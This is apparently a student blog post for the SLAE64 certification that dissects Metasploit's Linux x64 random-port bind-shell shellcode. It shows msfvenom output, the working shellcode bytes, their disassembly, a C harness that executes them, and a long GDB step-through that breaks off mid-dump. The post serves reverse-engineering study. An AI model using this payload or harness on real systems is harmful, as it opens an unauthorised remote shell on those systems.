# SLAE Assignment #5

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE64 - 1525

## Assignment

* Take up at least 3 shellcode samples created using Msfpayload for linux/x86_64
* Use GDB to dissect the functionality of the shellcode
* Document your analysis

## Listing shellcodes

let's list all shellcodes available in kali

```
# msfvenom -l payloads |grep "linux/x64"
    linux/x64/exec                                      Execute an arbitrary command
    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x64/shell_find_port                           Spawn a shell on an established connection
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
```

## Shellcode 1 Analysis

Shellcode options

```
root@kali:~# msfvenom -p linux/x64/shell_bind_tcp_random_port --payload-options
Options for payload/linux/x64/shell_bind_tcp_random_port:


       Name: Linux Command Shell, Bind TCP Random Port Inline
     Module: payload/linux/x64/shell_bind_tcp_random_port
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 57
       Rank: Normal

Provided by:
    Geyslan G. Bem <geyslan@gmail.com>

Description:
  Listen for a connection in a random port and spawn a command shell. 
  Use nmap to discover the open port: 'nmap -sS target -p-'.


Advanced options for payload/linux/x64/shell_bind_tcp_random_port:

    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
Evasion options for payload/linux/x64/shell_bind_tcp_random_port:

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
root@kali:~# 
```

Shellcode generation:

```
root@kali:~# msfvenom -p linux/x64/shell_bind_tcp_random_port --arch x64 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 57 bytes
Final size of c file: 264 bytes
unsigned char buf[] = 
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
```

Shellcode opcodes:

```
root@kali:~# echo -ne "\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05"| ndisasm -u -
00000000  48                dec eax
00000001  31F6              xor esi,esi
00000003  48                dec eax
00000004  F7E6              mul esi
00000006  FFC6              inc esi
00000008  6A02              push byte +0x2
0000000A  5F                pop edi
0000000B  B029              mov al,0x29
0000000D  0F05              syscall
0000000F  52                push edx
00000010  5E                pop esi
00000011  50                push eax
00000012  5F                pop edi
00000013  B032              mov al,0x32
00000015  0F05              syscall
00000017  B02B              mov al,0x2b
00000019  0F05              syscall
0000001B  57                push edi
0000001C  5E                pop esi
0000001D  48                dec eax
0000001E  97                xchg eax,edi
0000001F  FFCE              dec esi
00000021  B021              mov al,0x21
00000023  0F05              syscall
00000025  75F8              jnz 0x1f
00000027  52                push edx
00000028  48                dec eax
00000029  BF2F2F6269        mov edi,0x69622f2f
0000002E  6E                outsb
0000002F  2F                das
00000030  7368              jnc 0x9a
00000032  57                push edi
00000033  54                push esp
00000034  5F                pop edi
00000035  B03B              mov al,0x3b
00000037  0F05              syscall
root@kali:~# 
```

Let's create a skeleton program:

```
// Filename: shellcode1.c
// Author:  SLAE-935
//
// Shellcode: msfvenom -p linux/x64/shell_bind_tcp_random_port --arch x64 --platform linux -f c

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1
```

And compile it:

```
$ gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1
```

Full GDB dump with comments:

```
root@ubuntu-xenial:/src/src/Assignment 5# gdb -q ./shellcode1
Reading symbols from ./shellcode1...(no debugging symbols found)...done.
gdb-peda$ b *0x000000000040059a
Breakpoint 1 at 0x40059a
gdb-peda$ r
Starting program: /src/src/Assignment 5/shellcode1 
Shellcode Length:  57

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0xc6ffe6f748f63148 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
RIP: 0x40059a (<main+52>:	call   rdx)
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400589 <main+35>:	mov    QWORD PTR [rbp-0x8],0x601060
   0x400591 <main+43>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x400595 <main+47>:	mov    eax,0x0
=> 0x40059a <main+52>:	call   rdx
   0x40059c <main+54>:	nop
   0x40059d <main+55>:	leave  
   0x40059e <main+56>:	ret    
   0x40059f:	nop
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0008| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0016| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0032| 0x7fffffffe580 --> 0x0 
0040| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0048| 0x7fffffffe590 --> 0x100000000 
0056| 0x7fffffffe598 --> 0x400566 (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040059a in main ()
gdb-peda$ s






[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0xc6ffe6f748f63148 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601060 --> 0xc6ffe6f748f63148 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105a:	add    BYTE PTR [rax],al
   0x60105c:	add    BYTE PTR [rax],al
   0x60105e:	add    BYTE PTR [rax],al
=> 0x601060 <code>:	xor    rsi,rsi
   0x601063 <code+3>:	mul    rsi
   0x601066 <code+6>:	inc    esi
   0x601068 <code+8>:	push   0x2
   0x60106a <code+10>:	pop    rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601060 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0xc6ffe6f748f63148 
RSI: 0x0 
RDI: 0x1 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601063 --> 0x5f026ac6ffe6f748 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105c:	add    BYTE PTR [rax],al
   0x60105e:	add    BYTE PTR [rax],al
   0x601060 <code>:	xor    rsi,rsi
=> 0x601063 <code+3>:	mul    rsi
   0x601066 <code+6>:	inc    esi
   0x601068 <code+8>:	push   0x2
   0x60106a <code+10>:	pop    rdi
   0x60106b <code+11>:	mov    al,0x29
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601063 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x0 
RDI: 0x1 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601066 --> 0xf29b05f026ac6ff 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105e:	add    BYTE PTR [rax],al
   0x601060 <code>:	xor    rsi,rsi
   0x601063 <code+3>:	mul    rsi
=> 0x601066 <code+6>:	inc    esi
   0x601068 <code+8>:	push   0x2
   0x60106a <code+10>:	pop    rdi
   0x60106b <code+11>:	mov    al,0x29
   0x60106d <code+13>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601066 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601068 --> 0x52050f29b05f026a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601060 <code>:	xor    rsi,rsi
   0x601063 <code+3>:	mul    rsi
   0x601066 <code+6>:	inc    esi
=> 0x601068 <code+8>:	push   0x2
   0x60106a <code+10>:	pop    rdi
   0x60106b <code+11>:	mov    al,0x29
   0x60106d <code+13>:	syscall 
   0x60106f <code+15>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601068 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe550 --> 0x2 
RIP: 0x60106a --> 0x505e52050f29b05f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601063 <code+3>:	mul    rsi
   0x601066 <code+6>:	inc    esi
   0x601068 <code+8>:	push   0x2
=> 0x60106a <code+10>:	pop    rdi
   0x60106b <code+11>:	mov    al,0x29
   0x60106d <code+13>:	syscall 
   0x60106f <code+15>:	push   rdx
   0x601070 <code+16>:	pop    rsi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe550 --> 0x2 
0008| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0024| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0032| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe580 --> 0x0 
0056| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106a in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106b --> 0x5f505e52050f29b0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601066 <code+6>:	inc    esi
   0x601068 <code+8>:	push   0x2
   0x60106a <code+10>:	pop    rdi
=> 0x60106b <code+11>:	mov    al,0x29
   0x60106d <code+13>:	syscall 
   0x60106f <code+15>:	push   rdx
   0x601070 <code+16>:	pop    rsi
   0x601071 <code+17>:	push   rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106b in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106d --> 0x32b05f505e52050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601068 <code+8>:	push   0x2
   0x60106a <code+10>:	pop    rdi
   0x60106b <code+11>:	mov    al,0x29
=> 0x60106d <code+13>:	syscall 
   0x60106f <code+15>:	push   rdx
   0x601070 <code+16>:	pop    rsi
   0x601071 <code+17>:	push   rax
   0x601072 <code+18>:	pop    rdi
Guessed arguments:
arg[0]: 0x2 
arg[1]: 0x1 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106d in code ()
gdb-peda$ 





[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60106f --> 0x50f32b05f505e52 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106f --> 0x50f32b05f505e52 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106a <code+10>:	pop    rdi
   0x60106b <code+11>:	mov    al,0x29
   0x60106d <code+13>:	syscall 
=> 0x60106f <code+15>:	push   rdx
   0x601070 <code+16>:	pop    rsi
   0x601071 <code+17>:	push   rax
   0x601072 <code+18>:	pop    rdi
   0x601073 <code+19>:	mov    al,0x32
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106f in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60106f --> 0x50f32b05f505e52 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe550 --> 0x0 
RIP: 0x601070 --> 0xb0050f32b05f505e 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106b <code+11>:	mov    al,0x29
   0x60106d <code+13>:	syscall 
   0x60106f <code+15>:	push   rdx
=> 0x601070 <code+16>:	pop    rsi
   0x601071 <code+17>:	push   rax
   0x601072 <code+18>:	pop    rdi
   0x601073 <code+19>:	mov    al,0x32
   0x601075 <code+21>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe550 --> 0x0 
0008| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0024| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0032| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe580 --> 0x0 
0056| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601070 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60106f --> 0x50f32b05f505e52 
RDX: 0x0 
RSI: 0x0 
RDI: 0x2 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601071 --> 0x2bb0050f32b05f50 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106d <code+13>:	syscall 
   0x60106f <code+15>:	push   rdx
   0x601070 <code+16>:	pop    rsi
=> 0x601071 <code+17>:	push   rax
   0x601072 <code+18>:	pop    rdi
   0x601073 <code+19>:	mov    al,0x32
   0x601075 <code+21>:	syscall 
   0x601077 <code+23>:	mov    al,0x2b
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601071 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60106f --> 0x50f32b05f505e52 
RDX: 0x0 
RSI: 0x0 
RDI: 0x2 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe550 --> 0x3 
RIP: 0x601072 --> 0xf2bb0050f32b05f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106f <code+15>:	push   rdx
   0x601070 <code+16>:	pop    rsi
   0x601071 <code+17>:	push   rax
=> 0x601072 <code+18>:	pop    rdi
   0x601073 <code+19>:	mov    al,0x32
   0x601075 <code+21>:	syscall 
   0x601077 <code+23>:	mov    al,0x2b
   0x601079 <code+25>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe550 --> 0x3 
0008| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0024| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0032| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe580 --> 0x0 
0056| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601072 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60106f --> 0x50f32b05f505e52 
RDX: 0x0 
RSI: 0x0 
RDI: 0x3 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601073 --> 0x50f2bb0050f32b0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601070 <code+16>:	pop    rsi
   0x601071 <code+17>:	push   rax
   0x601072 <code+18>:	pop    rdi
=> 0x601073 <code+19>:	mov    al,0x32
   0x601075 <code+21>:	syscall 
   0x601077 <code+23>:	mov    al,0x2b
   0x601079 <code+25>:	syscall 
   0x60107b <code+27>:	push   rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601073 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
